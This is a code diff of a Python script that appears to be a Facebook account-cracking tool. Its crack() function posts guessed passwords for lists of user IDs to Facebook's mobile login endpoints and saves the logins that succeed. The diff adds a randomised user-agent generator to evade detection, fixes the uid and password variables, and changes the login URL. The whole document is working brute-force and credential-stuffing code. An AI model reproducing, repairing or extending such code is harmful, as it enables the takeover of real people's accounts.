@@ -26,9 +26,24 @@ loop = 0
 idz = []
 oks = []
 cps = []
+bkas = []
 sys.stdout.write('\x1b[1;35m\x1b]2;💛ATOM💗\x07')
 try:os.mkdir('/sdcard/XYZ')
 except:pass
+def useragent_facebook():
+        chrome = (f'{random.choice(["108","128"])}.0.{random.randrange(5111,6999)}.{random.randrange(60, 299)}')
+        angka = random.choice(['01','02','03','04','05','06','07','08','09','10'])
+        ubuntu = random.choice(['Ubuntu ','Ubuntu/','Ubuntu; ','Ubuntu-'])
+        linucx = random.choice(['GoogleApp','YandexSearch','LinuxApp'])
+        arm = str(random.randint(32,64))
+        windows = random.choice(['WOW64','Win32'])
+        tahun = random.choice(['2009','2010','2011','2012','2013','2014','2015','2016','2017','2018','2019','2020','2021','2022','2023','2024'])
+        return(random.choice([
+            f'Mozilla/5.0 (X11; {ubuntu}{random.randrange(10,22)}.{angka}; Linux {random.choice(["x86_64","i686"])}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
+            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
+            f'Mozilla/5.0 (Compatible; {ubuntu}{random.randrange(10,22)}.{angka}; Windows NT 10.0; {windows}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}',
+            f'Mozilla/5.0 (Linux; {ubuntu}{random.randrange(10,22)}.{angka}; Android {random.randint(9,14)}; moto g stylus 5G ({tahun})) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome} Safari/537.36 {linucx}/{str(random.randint(10,20))}.{str(random.randint(20,40))}.{str(random.randint(20,70))}.{str(random.randint(20,29))}.arm{arm}'
+        ]))
 ###-------[LOGO]-----------####
 logo= f'''\033[1;97m---------------------------------------------------
  \033[1;97m[\033[1;92m•\033[1;97m] Author   : sumon roy
@@ -103,6 +118,7 @@ def crack(uid, pww, total_idz):
     global loop
     global oks
     global cps
+    global bkas
     x = random.choice(["\033[1;90m","\033[1;91m","\033[1;92m" ,"\x1b[38;5;208m","\033[1;93m","\033[1;94m","\033[1;95m","\033[1;96m"])
     sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz))}\033[1;97m] ")
     sys.stdout.flush()
@@ -115,7 +131,7 @@ def crack(uid, pww, total_idz):
             'li': re.search('name="li" value="(.*?)"', str(requu1.text)).group(1),
             'try_number': '0',
             'unrecognized_tries': '0',
-            'email': ids,
+            'email': uid,
             'prefill_contact_point': '',
             'prefill_source': '',
             'prefill_type': '',
@@ -125,7 +141,7 @@ def crack(uid, pww, total_idz):
             'had_password_prefilled': 'false',
             'is_smart_lock': 'false',
             'bi_xrwh': '0',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pas),
+            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'bi_wvdp': '',
             'fb_dtsg': '',
             'jazoest': re.search('name="jazoest" value="(.*?)"', str(requu1.text)).group(1),
@@ -140,7 +156,7 @@ def crack(uid, pww, total_idz):
             "Host":"m.facebook.com",
             "Connection":"keep-alive",
             "Upgrade-Insecure-Requests":"1",
-            "User-Agent":ugenX(),
+            "User-Agent":useragent_facebook(),
             "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             "dnt":"1",
             "X-Requested-With":"mark.via.gp",
@@ -159,8 +175,8 @@ def crack(uid, pww, total_idz):
             "sec-ch-prefers-color-scheme":"dark",
             "Accept-Encoding":"gzip, deflate, br, zstd",
             "Accept-Language":"en-GB,en-US;q=0.9,en;q=0.8"}
-            url = 'https://free.facebook.com/login/device-based/regular/login/?login_attempt=1'
-            po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
+            url = 'https://touch.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8'
+            po = Session.post(url, data=data, headers=headers, allow_redirects=False).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
